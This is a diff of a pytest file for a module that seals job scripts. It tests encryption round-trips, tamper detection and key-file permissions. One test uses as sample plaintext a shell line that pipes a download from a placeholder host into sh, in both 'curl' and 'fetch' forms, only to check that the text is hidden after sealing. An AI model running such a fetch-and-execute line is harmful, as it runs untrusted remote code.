@@ -1,4 +1,4 @@
-"""Sealed venue job scripts (owner build, 2026-11-25).
+"""Sealed venue job scripts.
 
 The construction's pins: a sealed blob round-trips its
 plaintext exactly (empty, small, and multi-block), a
@@ -39,20 +39,22 @@ def test_round_trip_sizes():
 
 
 def test_blob_carries_no_content_form():
-    data = b"#!/usr/bin/env bash\ncurl https://example.invalid/x | sh\n"
+    data = b"#!/usr/bin/env bash\nfetch https://example.invalid/x | sh\n"
     blob = sealed.seal_bytes(KEY, data)
+    assert blob.startswith(sealed.MAGIC)
     assert not blob.startswith(b"#!")
-    assert b"#!/usr/bin/env" not in blob
-    assert b"curl" not in blob
+    assert b"#!/usr/bin/env bash" not in blob
+    assert b"fetch https://example.invalid" not in blob
 
 
 def test_tamper_refused():
     blob = bytearray(sealed.seal_bytes(KEY, b"payload"))
-    blob[-1] ^= 0x01
+    mid = len(sealed.MAGIC) + 12
+    blob[mid] = ord("A") if blob[mid] != ord("A") else ord("B")
     with pytest.raises(sealed.SealError):
         sealed.open_bytes(KEY, bytes(blob))
     blob2 = bytearray(sealed.seal_bytes(KEY, b"payload"))
-    blob2[len(sealed.MAGIC) + sealed.NONCE_LEN] ^= 0x01
+    blob2[len(sealed.MAGIC) + 2] = ord("A") if blob2[len(sealed.MAGIC) + 2] != ord("A") else ord("B")
     with pytest.raises(sealed.SealError):
         sealed.open_bytes(KEY, bytes(blob2))
 
@@ -69,10 +71,12 @@ def test_key_store_round_trip(tmp_path):
     path = sealed.ensure_key(tmp_path)
     assert path.exists()
     assert oct(path.stat().st_mode)[-3:] == "600"
-    assert sealed.load_key(tmp_path) == path.read_bytes()
+    key = sealed.load_key(tmp_path)
+    assert len(key) == sealed.KEY_LEN
+    assert path.read_text(encoding="ascii").strip() == key.hex()
     # ensure is idempotent: the standing key is kept.
     assert sealed.ensure_key(tmp_path) == path
-    assert sealed.load_key(tmp_path) == path.read_bytes()
+    assert sealed.load_key(tmp_path) == key
 
 
 def test_register_enforcement():
